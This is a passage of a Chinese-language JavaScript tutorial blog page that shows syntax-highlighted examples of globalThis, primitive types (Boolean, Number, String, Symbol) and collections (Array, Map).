class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>); <span class="comment">// =&gt; undefined</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsglobal-4"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// web</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(globalThis); <span class="comment">// =&gt; Window &#123;...&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// nodejs</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(globalThis); <span class="comment">// =&gt; Object [global] &#123;...&#125;</span></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="数据类型（data-type）"><a href="#数据类型（data-type）" class="headerlink" title="数据类型（data type）"></a>数据类型（data type）</h1><h2 id="基本类型（primitive-type）"><a href="#基本类型（primitive-type）" class="headerlink" title="基本类型（primitive type）"></a>基本类型（primitive type）</h2><h3 id="Boolean"><a href="#Boolean" class="headerlink" title="Boolean"></a>Boolean</h3><ul>
<li>false情况：false、0、””、NaN、null、undefined</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Boolean() function */</span></span><br><span class="line"><span class="title class_">Boolean</span>(<span class="string">&quot;&quot;</span>); <span class="comment">// false</span></span><br><span class="line"><span class="title class_">Boolean</span>(<span class="number">234</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h3 id="Number"><a href="#Number" class="headerlink" title="Number"></a>Number</h3><ul>
<li>NaN - 无效数值（Not a Number），参与计算的结果仍为NaN</li>
<li>Infinity - 除0结果</li>
</ul>
<div class="tabs" id="number"><ul class="nav-tabs"><li class="tab active"><a href="#number-1">Basic</a></li><li class="tab"><a href="#number-2">string2number</a></li></ul><div class="tab-content"><div class="tab-pane active" id="number-1"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* primitive */</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">3</span> / <span class="number">2</span>);     <span class="comment">// 1.5 - number 整数默认以浮点数运算</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">0.1</span> + <span class="number">0.2</span>); <span class="comment">// 0.30000000000000004 - number 浮点运算有时不精确</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">0b111110111</span>); <span class="comment">// 503 前缀0b - number (binary)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">0o767</span>);       <span class="comment">// 503 前缀0o - number (octal)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">0x1f7</span>);       <span class="comment">// 503 前缀0x - number (hexadecimal)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5.03e2</span>);      <span class="comment">// 503 后缀指数 - number</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(-<span class="number">3n</span> / <span class="number">2n</span>);    <span class="comment">// -1n 后缀n - bigint 不能和number混合运算</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Math */</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">sin</span>(<span class="number">3.5</span>);</span><br><span class="line"><span class="keyword">const</span> circumference = <span class="number">2</span> * <span class="title class_">Math</span>.<span class="property">PI</span> * r;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="number-2"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27; 0xF&#x27;</span>, <span class="number">16</span>); <span class="comment">// 15</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;321&#x27;</span>, <span class="number">2</span>);   <span class="comment">// NaN</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="number">4.567</span>);           <span class="comment">// 4.567</span></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&#x27;4.567abcdefgh&#x27;</span>); <span class="comment">// 4.567</span></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&#x27;abcdefgh&#x27;</span>);      <span class="comment">// NaN</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> a = <span class="keyword">new</span> <span class="title class_">Number</span>(<span class="string">&#x27;123&#x27;</span>); <span class="comment">// a === 123 is false</span></span><br><span class="line"><span class="keyword">const</span> b = <span class="title class_">Number</span>(<span class="string">&#x27;123&#x27;</span>);     <span class="comment">// b === 123 is true</span></span><br><span class="line">a <span class="keyword">instanceof</span> <span class="title class_">Number</span>;         <span class="comment">// is true</span></span><br><span class="line">b <span class="keyword">instanceof</span> <span class="title class_">Number</span>;         <span class="comment">// is false</span></span><br><span class="line"><span class="keyword">typeof</span> a <span class="comment">// &quot;object&quot;</span></span><br><span class="line"><span class="keyword">typeof</span> b <span class="comment">// &quot;number&quot;</span></span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><ul>
<li>UTF-16编码的Unicode字符串，单个字符和字符串没有区别</li>
<li><code>+</code>操作符中有字符串，连接结果也是字符串</li>
</ul>
<div class="tabs" id="string"><ul class="nav-tabs"><li class="tab active"><a href="#string-1">Basic</a></li><li class="tab"><a href="#string-2">Multiline</a></li></ul><div class="tab-content"><div class="tab-pane active" id="string-1"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello&quot;</span>[<span class="number">1</span>] === <span class="string">&quot;e&quot;</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> age = <span class="number">25</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;I am &quot;</span> + age + <span class="string">&quot; years old.&quot;</span>); <span class="comment">// String concatenation</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`I am <span class="subst">$&#123;age&#125;</span> years old.`</span>);      <span class="comment">// Template literal (similar Python&#x27;s f-strings)</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="string-2"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES5</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">HTML5</span>_SKELETON =</span><br><span class="line">    <span class="string">&#x27;&lt;!doctype html&gt;\n&#x27;</span> +</span><br><span class="line">    <span class="string">&#x27;&lt;html&gt;\n&#x27;</span> +</span><br><span class="line">    <span class="string">&#x27;&lt;/html&gt;\n&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">HTML5</span>_SKELETON = <span class="string">&#x27;\</span></span><br><span class="line"><span class="string">    &lt;!doctype html&gt;\n\</span></span><br><span class="line"><span class="string">    &lt;html&gt;\n\</span></span><br><span class="line"><span class="string">    &lt;/html&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6 (template literals)</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">HTML5</span>_SKELETON = <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;`</span>;</span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="Symbol"><a href="#Symbol" class="headerlink" title="Symbol"></a>Symbol</h3><ul>
<li>ES6支持symbol类型通过<code>Symbol()</code>函数创建，保证唯一性</li>
</ul>
<div class="tabs" id="jstypesymbol"><ul class="nav-tabs"><li class="tab active"><a href="#jstypesymbol-1">General</a></li><li class="tab"><a href="#jstypesymbol-2">ConstantDefine</a></li><li class="tab"><a href="#jstypesymbol-3">KeyOfProperty</a></li></ul><div class="tab-content"><div class="tab-pane active" id="jstypesymbol-1"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sym = <span class="title class_">Symbol</span>(<span class="string">&#x27;desc&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">String</span>(sym));    <span class="comment">// Symbol(desc)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(sym.<span class="title function_">toString</span>()); <span class="comment">// Symbol(desc)</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> <span class="title class_">Symbol</span>())       <span class="comment">// symbol</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Symbol</span>() === <span class="title class_">Symbol</span>()) <span class="comment">// false</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jstypesymbol-2"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">COLOR_RED</span>    = <span class="title class_">Symbol</span>(<span class="string">&#x27;Red&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">COLOR_GREEN</span>  = <span class="title class_">Symbol</span>(<span class="string">&#x27;Green&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">COLOR_BLUE</span>   = <span class="title class_">Symbol</span>(<span class="string">&#x27;Blue&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getColor</span>(<span class="params">color</span>) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (color) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="attr">COLOR_RED</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable constant_">COLOR_RED</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="attr">COLOR_GREEN</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable constant_">COLOR_GREEN</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="attr">COLOR_BLUE</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable constant_">COLOR_BLUE</span>;</span><br><span class="line">        <span class="attr">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(<span class="string">&#x27;Unknown color: &#x27;</span>+color);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getColor</span>(<span class="variable constant_">COLOR_RED</span>)); <span class="comment">// Symbol(Red)</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jstypesymbol-3"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> X = <span class="title class_">Symbol</span>();</span><br><span class="line"><span class="keyword">const</span> a = &#123;&#125;;</span><br><span class="line">a[X] = <span class="number">12</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a[X]); <span class="comment">// 12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Y = <span class="title class_">Symbol</span>();</span><br><span class="line"><span class="keyword">const</span> b = &#123;</span><br><span class="line">    [Y]: <span class="number">12</span>,</span><br><span class="line">    <span class="attr">m</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">n</span>: <span class="number">4</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(b, <span class="string">&#x27;m&#x27;</span>, &#123; <span class="attr">enumerable</span>: <span class="literal">false</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b[Y]); <span class="comment">// 12</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">getOwnPropertyNames</span>(b));   <span class="comment">// [ &#x27;m&#x27;, &#x27;n&#x27; ] (key: string)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">getOwnPropertySymbols</span>(b)); <span class="comment">// [ Symbol() ] (key: symbol)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(b)); <span class="comment">// [ &#x27;m&#x27;, &#x27;n&#x27;, Symbol() ] (key: all)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">keys</span>(b)); <span class="comment">// [ &#x27;n&#x27; ] (key: string, enumerable)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Z = <span class="title class_">Symbol</span>();</span><br><span class="line"><span class="keyword">const</span> c = &#123;</span><br><span class="line">    [Z]() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">12</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c[Z]()); <span class="comment">// 12</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="集合类型（collection）"><a href="#集合类型（collection）" class="headerlink" title="集合类型（collection）"></a>集合类型（collection）</h2><h3 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h3><ul>
<li>Array对象是iterable，可作为基类使用</li>
<li><code>Array.from()</code>将array-like数据转换为Array对象，可代替<code>Array.prototype.map.call()</code></li>
<li><code>Array.of()</code>可创建Array对象，用于弥补<code>new Array()</code>覆盖不到的场景，例如创建单个元素的Array对象</li>
</ul>
<div class="tabs" id="jsobjectarray"><ul class="nav-tabs"><li class="tab active"><a href="#jsobjectarray-1">StaticMethod</a></li><li class="tab"><a href="#jsobjectarray-2">PrototypeMethod</a></li><li class="tab"><a href="#jsobjectarray-3">Iterate</a></li><li class="tab"><a href="#jsobjectarray-4">HoleInArray</a></li></ul><div class="tab-content"><div class="tab-pane active" id="jsobjectarray-1"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// New Array - Array.from(arrayLike, mapFunc?, thisArg?)</span></span><br><span class="line"><span class="keyword">const</span> arrayLike = &#123; <span class="attr">length</span>: <span class="number">2</span>, <span class="number">0</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;b&#x27;</span> &#125;;</span><br><span class="line"><span class="keyword">const</span> arr = <span class="title class_">Array</span>.<span class="title function_">from</span>(arrayLike);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr); <span class="comment">// [ &#x27;a&#x27;, &#x27;b&#x27; ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// New Array - Array.of(...items)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">3</span>, <span class="number">11</span>, <span class="number">8</span>)); <span class="comment">// [ 3, 11, 8 ]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">3</span>)); <span class="comment">// [ &lt;3 empty items&gt; ]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Array</span>.<span class="title function_">of</span>(<span class="number">3</span>));  <span class="comment">// [ 3 ]</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsobjectarray-2"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Array.prototype.find(predicate, thisArg?)</span></span><br><span class="line"><span class="keyword">const</span> arr1 = [<span class="number">6</span>, -<span class="number">5</span>, -<span class="number">8</span>]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr1.<span class="title function_">find</span>(<span class="function"><span class="params">x</span> =&gt;</span> x &lt; <span class="number">0</span>));      <span class="comment">// -5</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr1.<span class="title function_">findIndex</span>(<span class="function"><span class="params">x</span> =&gt;</span> x &lt; <span class="number">0</span>)); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Array</span> &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> arr2 = <span class="title class_">MyArray</span>.<span class="title function_">from</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="function"><span class="params">x</span> =&gt;</span> x * x);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr2); <span class="comment">// MyArray(3) [ 1, 4, 9 ]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> arr3 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].<span class="title function_">map</span>(<span class="function"><span class="params">x</span> =&gt;</span> x * x);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr3); <span class="comment">// [ 1, 4, 9 ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Array.prototype.copyWithin()</span></span><br><span class="line"><span class="keyword">const</span> arr4 = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr4.<span class="title function_">copyWithin</span>(<span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>)); <span class="comment">// [ 0, 0, 1, 3 ] 把[0,2)的元素拷贝到index=1的位置</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr4); <span class="comment">// [ 0, 0, 1, 3 ] (原址拷贝)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Array.prototype.fill(value : any, start=0, end=this.length)</span></span><br><span class="line"><span class="keyword">const</span> arr5 = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr5.<span class="title function_">fill</span>(<span class="number">7</span>)); <span class="comment">// [ 7, 7, 7 ]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr5);         <span class="comment">// [ 7, 7, 7 ]</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsobjectarray-3"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Iterating over Arrays</span></span><br><span class="line"><span class="comment">// Array.prototype.entries()</span></span><br><span class="line"><span class="comment">// Array.prototype.keys()</span></span><br><span class="line"><span class="comment">// Array.prototype.values()</span></span><br><span class="line">arr = [ <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span> ];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Array</span>.<span class="title function_">from</span>(arr.<span class="title function_">keys</span>())); <span class="comment">// [ 0, 1 ]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([...arr.<span class="title function_">values</span>()]);      <span class="comment">// [ &#x27;a&#x27;, &#x27;b&#x27; ]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([...arr.<span class="title function_">entries</span>()]);     <span class="comment">// [ [ 0, &#x27;a&#x27; ], [ 1, &#x27;b&#x27; ] ]</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> x <span class="keyword">of</span> arr) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x); <span class="comment">// a  b</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> [index, element] <span class="keyword">of</span> arr.<span class="title function_">entries</span>()) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(index, element); <span class="comment">// 0 a  1 b</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Iteration</span></span><br><span class="line"><span class="keyword">var</span> arr7 = [, <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">var</span> iter7 = arr7[<span class="title class_">Symbol</span>.<span class="property">iterator</span>]();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(iter7.<span class="title function_">next</span>()); <span class="comment">// &#123; value: undefined, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(iter7.<span class="title function_">next</span>()); <span class="comment">// &#123; value: &#x27;a&#x27;, done: false &#125;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsobjectarray-4"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr6 = [<span class="string">&#x27;a&#x27;</span>, ,<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">0</span> <span class="keyword">in</span> arr6); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span> <span class="keyword">in</span> arr6); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span> <span class="keyword">in</span> arr6); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><ul>
<li>ES6中Map的key可以是任意值，是unordered</li>
<li>WeakMap的key必须是object，并且不会阻止GC (garbage-collected)回收它</li>
<li>WeakMap不允许iteration、looping和clearing</li>
</ul>
<div class="tabs" id="jsobjectmap"><ul class="nav-tabs"><li class="tab active"><a href="#jsobjectmap-1">Basic</a></li><li class="tab"><a href="#jsobjectmap-2">ArrayOrJson</a></li><li class="tab"><a href="#jsobjectmap-3">WeakMap</a></li></ul><div class="tab-content"><div class="tab-pane active" id="jsobjectmap-1"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Basic</span></span><br><span class="line"><span class="keyword">const</span> m = <span class="keyword">new</span> <span class="title class_">Map</span>([</span><br><span class="line">    [ <span class="number">1</span>, <span class="string">&#x27;a&#x27;</span> ],</span><br><span class="line">    [ <span class="number">2</span>, <span class="string">&#x27;b&#x27;</span> ],</span><br><span class="line">]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m);             <span class="comment">// Map &#123; 1 =&gt; &#x27;a&#x27;, 2 =&gt; &#x27;b&#x27; &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m.<span class="title function_">set</span>(<span class="number">3</span>, <span class="string">&#x27;c&#x27;</span>)); <span class="comment">// Map &#123; 1 =&gt; &#x27;a&#x27;, 2 =&gt; &#x27;b&#x27;, 3 =&gt; &#x27;c&#x27; &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m.<span class="title function_">get</span>(<span class="number">3</span>));      <span class="comment">// c</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m.<span class="title function_">has</span>(<span class="number">3</span>));      <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m.<span class="title function_">delete</span>(<span class="number">2</span>));   <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m.<span class="title function_">has</span>(<span class="number">2</span>));      <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m.<span class="property">size</span>);        <span class="comment">// 2</span></span><br><span class="line">m.<span class="title function_">clear</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Looping</span></span><br><span class="line"><span class="keyword">const</span> m1 = <span class="keyword">new</span> <span class="title class_">Map</span>().<span class="title function_">set</span>(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>).<span class="title function_">set</span>(<span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m1); <span class="comment">// Map &#123; 1 =&gt; &#x27;a&#x27;, 2 =&gt; &#x27;b&#x27; &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([...m1]); <span class="comment">// [ [ 1, &#x27;a&#x27; ], [ 2, &#x27;b&#x27; ] ] (toArray)</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">of</span> m1.<span class="title function_">keys</span>())</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(key);   <span class="comment">// 1  2</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> value <span class="keyword">of</span> m1.<span class="title function_">values</span>())</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(value); <span class="comment">// a  b</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m1[<span class="title class_">Symbol</span>.<span class="property">iterator</span>] === m1.<span class="property">entries</span>); <span class="comment">// true</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> entry <span class="keyword">of</span> m1.<span class="title function_">entries</span>())</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(entry[<span class="number">0</span>], entry[<span class="number">1</span>]); <span class="comment">// 1 a  2 b</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> [key, value] <span class="keyword">of</span> m1.<span class="title function_">entries</span>())</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(key, value); <span class="comment">// 1 a  2 b</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> [key, value] <span class="keyword">of</span> m1)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(key, value); <span class="comment">// 1 a  2 b</span></span><br><span class="line">m1.<span class="title function_">forEach</span>(<span class="function">(<span class="params">value, key</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(key, value); <span class="comment">// 1 a  2 b</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Mapping and filtering</span></span><br><span class="line"><span class="keyword">const</span> m2 = <span class="keyword">new</span> <span class="title class_">Map</span>(</span><br><span class="line">    [...m1].<span class="title function_">map</span>(<span class="function">(<span class="params">[k, v]</span>) =&gt;</span> [k * <span class="number">2</span>, <span class="string">&#x27;_&#x27;</span> + v])</span><br><span class="line">);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m2); <span class="comment">// Map &#123; 2 =&gt; &#x27;_a&#x27;, 4 =&gt; &#x27;_b&#x27; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> m3 = <span class="keyword">new</span> <span class="title class_">Map</span>(</span><br><span class="line">    [...m1].<span class="title function_">filter</span>(<span class="function">(<span class="params">[k, v]</span>) =&gt;</span> k &lt; <span class="number">2</span>)</span><br><span class="line">);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m3); <span class="comment">// Map &#123; 1 =&gt; &#x27;a&#x27; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Join (Spread syntax)</span></span><br><span class="line"><span class="keyword">const</span> m4 = <span class="keyword">new</span> <span class="title class_">Map</span>().<span class="title function_">set</span>(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> m5 = <span class="keyword">new</span> <span class="title class_">Map</span>().<span class="title function_">set</span>(<span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> m6 = <span class="keyword">new</span> <span class="title class_">Map</span>([...m4, ...m5]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m6); <span class="comment">// Map &#123; 1 =&gt; &#x27;a&#x27;, 2 =&gt; &#x27;b&#x27; &#125;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsobjectmap-2"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ToArray</span></span><br><span class="line"><span class="keyword">const</span> m1 = <span class="keyword">new</span> <span class="title class_">Map</span>().<span class="title function_">set</span>(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>).<span class="title function_">set</span>(&#123;<span class="attr">b</span>: <span class="number">2</span>&#125;, [<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">const</span> a1 = [...m1] <span class="comment">// ToArray by spread syntax</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m1); <span class="comment">// Map &#123; 1 =&gt; &#x27;a&#x27;, &#123; b: 2 &#125; =&gt; [ 2 ] &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a1); <span class="comment">// [ [ 1, &#x27;a&#x27; ], [ &#123; b: 2 &#125;, [ 2 ] ] ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ToJson</span></span><br><span class="line"><span class="keyword">const</span> m2 = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(m1);</span><br><span class="line"><span class="keyword">const</span> m3 = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(a1);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m2); <span class="comment">// &#123;&#125; (don&#x27;t do like this)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m3); <span class="comment">// [[1,&quot;a&quot;],[&#123;&quot;b&quot;:2&#125;,[2]]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// FromJson</span></span><br><span class="line"><span class="keyword">const</span> m4 = <span class="keyword">new</span> <span class="title class_">Map</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(m3));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m4); <span class="comment">// Map &#123; 1 =&gt; &#x27;a&#x27;, &#123; b: 2 &#125; =&gt; [ 2 ] &#125;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsobjectmap-3"><figure class="highlight js"><table><tr><td 